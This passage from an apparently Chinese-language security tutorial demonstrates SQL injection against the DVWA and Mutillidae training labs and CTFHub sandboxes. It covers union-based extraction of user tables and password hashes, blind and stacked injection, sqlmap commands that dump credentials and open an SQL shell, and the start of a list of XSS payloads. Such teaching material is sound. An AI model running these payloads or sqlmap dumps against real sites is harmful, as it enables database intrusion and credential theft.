class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user_id</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: first_name</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: last_name</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: password</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27; -- dd</span><br><span class="line">First name: 1</span><br><span class="line">Surname: avatar</span><br></pre></td></tr></table></figure><p>知道表中的列名后，可以根据列查询对应列的数据，比如查询账号密码<strong>‘ union select user,password from users — dd</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: admin</span><br><span class="line">Surname: 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: gordonb</span><br><span class="line">Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: 1337</span><br><span class="line">Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: pablo</span><br><span class="line">Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: smithy</span><br><span class="line">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select user,password from users -- dd</span><br><span class="line">First name: user</span><br><span class="line">Surname: ee11cbb19052e40b07aac0ca060c23ee</span><br></pre></td></tr></table></figure><p>密码是MD5加密的，只要找个MD5解密网页就可知道正确密码。</p><p>如果我们需要的信息有4列，但系统给的字段只有2列，我们可以用concat()函数实现字符串合并，<strong>‘ union select password,concat(first_name,’ ‘, last_name,’ ‘, user) from users — dd</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">Surname: admin admin admin</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: e99a18c428cb38d5f260853678922e03</span><br><span class="line">Surname: Gordon Brown gordonb</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line">Surname: Hack Me 1337</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line">Surname: Pablo Picasso pablo</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">Surname: Bob Smith smithy</span><br><span class="line"></span><br><span class="line">ID: &#x27; union select password,concat(first_name,&#x27; &#x27;, last_name,&#x27; &#x27;, user) from users -- dd</span><br><span class="line">First name: ee11cbb19052e40b07aac0ca060c23ee</span><br><span class="line">Surname: user user user</span><br></pre></td></tr></table></figure><p>在函数被过滤的情况下，可以选择堆叠注入，如：<strong>0’;show databases;#</strong>，也可以用contact()连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure><h2 id="3-2-时间盲注"><a href="#3-2-时间盲注" class="headerlink" title="3.2 时间盲注"></a>3.2 时间盲注</h2><p>输入单引号没有反应，但不一定它没有注入漏洞。可以试一下<strong>3’ and sleep(5)#</strong>，给它一个真条件3，闭合，再停留5秒，发现网页会加载5秒，说明有注入点。</p><h3 id="3-2-1-SQL盲注-低"><a href="#3-2-1-SQL盲注-低" class="headerlink" title="3.2.1 SQL盲注[低]"></a>3.2.1 SQL盲注[低]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: admin</span><br><span class="line">Surname: 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: gordonb</span><br><span class="line">Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: 1337</span><br><span class="line">Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: pablo</span><br><span class="line">Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: smithy</span><br><span class="line">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line"></span><br><span class="line">ID: 3&#x27; union select user,password from users -- dd</span><br><span class="line">First name: user</span><br><span class="line">Surname: ee11cbb19052e40b07aac0ca060c23ee</span><br></pre></td></tr></table></figure><h2 id="3-3-堆叠注入"><a href="#3-3-堆叠注入" class="headerlink" title="3.3 堆叠注入"></a>3.3 堆叠注入</h2><p>在函数被过滤的情况下，可以选择堆叠注入，如：<strong>0’;show databases;#</strong>。也可以用contact()连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure><h2 id="3-4-自动化注入"><a href="#3-4-自动化注入" class="headerlink" title="3.4 自动化注入"></a>3.4 自动化注入</h2><p>kali中sqlmap一些用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class="line">--batch             Never ask for user input, use the default behavior</span><br><span class="line">-p TESTPARAMETER    Testable parameter(s)</span><br><span class="line">--dbms=DBMS         Force back-end DBMS to provided value</span><br><span class="line">--level=LEVEL       Level of tests to perform (1-5, default 1)</span><br><span class="line">--risk=RISK         Risk of tests to perform (1-3, default 1)</span><br><span class="line">--dbs获取所有数据库</span><br><span class="line">--current-db获取当前数据库</span><br><span class="line">--users获取所有用户</span><br><span class="line">--current-user获取当前用户</span><br><span class="line">-D databese_name --tables获取database_name的所有表</span><br><span class="line">-D databese_name -T table_name --columns获取database_name的table_name的所有列</span><br><span class="line">-D databese_name -T table_name -C column_name --dump获取database_name的table_name的column_name的数据</span><br><span class="line">--cookie=COOKIE添加cookie</span><br></pre></td></tr></table></figure><p>GET请求注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-9</span>a6148b6244df91d.sandbox.ctfhub.com:<span class="number">10800</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --tables</span></span><br><span class="line"></span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-9</span>a6148b6244df91d.sandbox.ctfhub.com:<span class="number">10800</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch -D sqli -T flag --columns</span></span><br><span class="line"></span><br><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-9</span>a6148b6244df91d.sandbox.ctfhub.com:<span class="number">10800</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch -D sqli -T flag -C flag --dump</span></span><br></pre></td></tr></table></figure><p>POST请求注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-9</span>a6148b6244df91d.sandbox.ctfhub.com:<span class="number">10800</span> <span class="comment">--batch --data=&quot;id=1&amp;pwd=333&quot;</span></span><br></pre></td></tr></table></figure><p>遇到过滤情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="operator">-</span>b025f09fc3033f00.sandbox.ctfhub.com:<span class="number">10800</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --tables --tamper &quot;space2comment.py&quot;</span></span><br></pre></td></tr></table></figure><p>脚本名：<code>space2comment.py</code> </p><p>作用：Replaces space character ‘ ‘ with comments  /**/。</p><p>也就是用注释/**/替换空格字符’ ‘。</p><p>sqlmap 中的 tamper 脚本有很多，例如：<code>equaltolike.py</code>（作用是用like代替等号）、<code>apostrophemask.py</code>（作用是用utf8代替引号）、 <code>greatest.py</code> （作用是绕过过滤’&gt;’ ，用GREATEST替换大于号）等。</p><h3 id="3-4-1-自动化注入-低"><a href="#3-4-1-自动化注入-低" class="headerlink" title="3.4.1 自动化注入(低)"></a>3.4.1 自动化注入(低)</h3><p>进入OWASP Mutillidae Ⅱ（不需要登录），选择左侧全部首一一栏，进入登录界面，随便输入错误的名字密码后，复制网页地址，用sqlmap查看网页是否有sql注入漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.137.146/mutillidae/index.php?page=user-info.php&amp;username=91&amp;password=%3Bohk&amp;user-info-php-submit-button=View+Account+Details&quot; -p username --batch//只看username有无注入漏洞</span><br><span class="line"></span><br><span class="line">[14:30:48] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)</span><br><span class="line">web application technology: PHP 5.3.2, PHP, Apache 2.2.14</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0//数据库、系统、php等都出来了表示有注入漏洞</span><br><span class="line">[14:30:52] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.137.146&#x27;  </span><br><span class="line"></span><br><span class="line">//获得表中的数据</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/mutillidae/index.php?page=user-info.php&amp;username=91&amp;password=%3Bohk&amp;user-info-php-submit-button=View+Account+Details&quot; --batch -D nowasp -T accounts -C username,password --dump</span><br><span class="line"></span><br><span class="line">Database: nowasp</span><br><span class="line">Table: accounts</span><br><span class="line">[24 entries]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| username | password     |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| admin    | admin        |</span><br><span class="line">| adrian   | somepassword |</span><br><span class="line">| john     | monkey       |</span><br><span class="line">| jeremy   | password     |</span><br><span class="line">| bryce    | password     |</span><br><span class="line">| samurai  | samurai      |</span><br><span class="line">| jim      | password     |</span><br><span class="line">| bobby    | password     |</span><br><span class="line">| simba    | password     |</span><br><span class="line">| dreveil  | password     |</span><br><span class="line">| scotty   | password     |</span><br><span class="line">| cal      | password     |</span><br><span class="line">| john     | password     |</span><br><span class="line">| kevin    | 42           |</span><br><span class="line">| dave     | set          |</span><br><span class="line">| patches  | tortoise     |</span><br><span class="line">| rocky    | stripes      |</span><br><span class="line">| tim      | lanmaster53  |</span><br><span class="line">| ABaker   | SoSecret     |</span><br><span class="line">| PPan     | NotTelling   |</span><br><span class="line">| CHook    | JollyRoger   |</span><br><span class="line">| james    | i&lt;3devs      |</span><br><span class="line">| user     | user         |</span><br><span class="line">| ed       | pentest      |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure><p>如果SQL注入点没有经过登录就可找到，可以直接按照上述方法注入；如果需要登录，肯定不能通过提交方式去登录，因为你也不知道账号密码，所以要通过找cookie（cookie是前端，session是后端）去登录。这也是<strong>SQL注入[中、高]，SQL盲注[中、高]</strong>的解决办法。</p><p>回到DVWA（需要登录）的SQL注入，随便输入一个错误数字，用火狐插件cookie监视器将这个网址的所有cookie复制下来（复制下来的是冒号，要改成等号），或者可以通过burpsuite抓包拿到cookie，再跑，结果成功渗透。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; -p id</span><br><span class="line"></span><br><span class="line">[16:25:54] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)</span><br><span class="line">web application technology: PHP 5.3.2, Apache 2.2.14</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">[16:25:54] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.137.146&#x27;   </span><br><span class="line"></span><br><span class="line">//先找数据库</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; --dbs</span><br><span class="line"></span><br><span class="line">available databases [2]:</span><br><span class="line">[*] dvwa</span><br><span class="line">[*] information_schema</span><br><span class="line"></span><br><span class="line">//再找表</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; -D dvwa --tables</span><br><span class="line"></span><br><span class="line">Database: dvwa</span><br><span class="line">[2 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| guestbook |</span><br><span class="line">| users     |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">//再找列</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; -D dvwa -T users --columns</span><br><span class="line"></span><br><span class="line">Database: dvwa</span><br><span class="line">Table: users</span><br><span class="line">[6 columns]</span><br><span class="line">+------------+-------------+</span><br><span class="line">| Column     | Type        |</span><br><span class="line">+------------+-------------+</span><br><span class="line">| user       | varchar(15) |</span><br><span class="line">| avatar     | varchar(70) |</span><br><span class="line">| first_name | varchar(15) |</span><br><span class="line">| last_name  | varchar(15) |</span><br><span class="line">| password   | varchar(32) |</span><br><span class="line">| user_id    | int(6)      |</span><br><span class="line">+------------+-------------+</span><br><span class="line"></span><br><span class="line">//再找表中数据</span><br><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; -D dvwa -T users -C user,password --dump</span><br><span class="line"></span><br><span class="line">Database: dvwa                                                    </span><br><span class="line">Table: users</span><br><span class="line">[6 entries]</span><br><span class="line">+---------+---------------------------------------------+</span><br><span class="line">| user    | password                                    |</span><br><span class="line">+---------+---------------------------------------------+</span><br><span class="line">| admin   | 21232f297a57a5a743894a0e4a801fc3 (admin)    |</span><br><span class="line">| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |</span><br><span class="line">| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |</span><br><span class="line">| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |</span><br><span class="line">| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |</span><br><span class="line">| user    | ee11cbb19052e40b07aac0ca060c23ee (user)     |</span><br><span class="line">+---------+---------------------------------------------+</span><br></pre></td></tr></table></figure><p>提权操作，与数据库交互：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.137.146/dvwa/vulnerabilities/sqli/?id=99&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=9nfdguaho24opqkkqca6ma4ji0;security=low;acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada&quot; --sql-shell</span><br><span class="line"></span><br><span class="line">sql-shell&gt; select user,password from users;</span><br><span class="line">[16:44:30] [INFO] fetching SQL SELECT statement query output: &#x27;select user,password from users&#x27;                                       </span><br><span class="line">[16:44:30] [CRITICAL] connection dropped or unknown HTTP status code received. Try to force the HTTP User-Agent header with option &#x27;--user-agent&#x27; or switch &#x27;--random-agent&#x27;. sqlmap is going to retry the request(s)</span><br><span class="line">select user,password from users [6]:</span><br><span class="line">[*] admin, 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">[*] gordonb, e99a18c428cb38d5f260853678922e03</span><br><span class="line">[*] 1337, 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line">[*] pablo, 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line">[*] smithy, 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">[*] user, ee11cbb19052e40b07aac0ca060c23ee</span><br></pre></td></tr></table></figure><h1 id="4-XSS"><a href="#4-XSS" class="headerlink" title="4. XSS"></a>4. XSS</h1><p>Cross Site Scripting</p><p>经常遭受跨站脚本攻击的典型应用有：邮件、论坛、即时通信、留言板、社交平台等。</p><h2 id="4-1-XSS跨站脚本攻击"><a href="#4-1-XSS跨站脚本攻击" class="headerlink" title="4.1 XSS跨站脚本攻击"></a>4.1 XSS跨站脚本攻击</h2><p>XSS是对客户端进行攻击。</p><p><strong>常用的HTML标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>iframe元素会创建包含另外一个文档的内联框架</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>标签定义多行的文本输入控件</span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span>img元素向网页中嵌入一张图片</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>标签用于定义客户端脚本，如JavaScript</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    script元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            必需的type属性规定脚本的MIME类型</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            JavaScript的常见应用是图像操作，表单验证以及动态内容更新</span></span></span><br></pre></td></tr></table></figure><p><strong>常用JavaScript方法</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alertalert()方法用于显示带有一条指定信息和一个确认按钮的警告框</span><br><span class="line">window.locationwindow.location对象用于获得当前页面的地址，并把浏览器重定向到新的页面</span><br><span class="line">location.href返回当前显示的文档的完整URL</span><br><span class="line">onload 一张页面或一张图片完成加载</span><br><span class="line">onsubmit确认按钮被点击</span><br><span class="line">onerror在加载文档或图片时发生错误</span><br></pre></td></tr></table></figure><p><strong>构造XSS脚本</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">弹框警告</span><br><span class="line">此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号&#x27;，一旦此脚本能执行，也就意味着后端服务器没有对特殊字符(<span class="tag">&lt;&gt;</span>/&#x27;)做过滤，这样就可以证明这个页面位置存在XSS漏洞。</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;!-弹出cookie-&gt;</span><br><span class="line"></span><br><span class="line">页面嵌套</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">width</span>=<span class="string">300</span> <span class="attr">height</span>=<span class="string">300</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> &lt;!-看不见的页面嵌套-&gt;</span><br><span class="line"></span><br><span class="line">页面重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">弹框警告并重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;请移步到我们的新站&quot;</span>);location.<span class="property">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);location.<span class="property">href</span>=<span 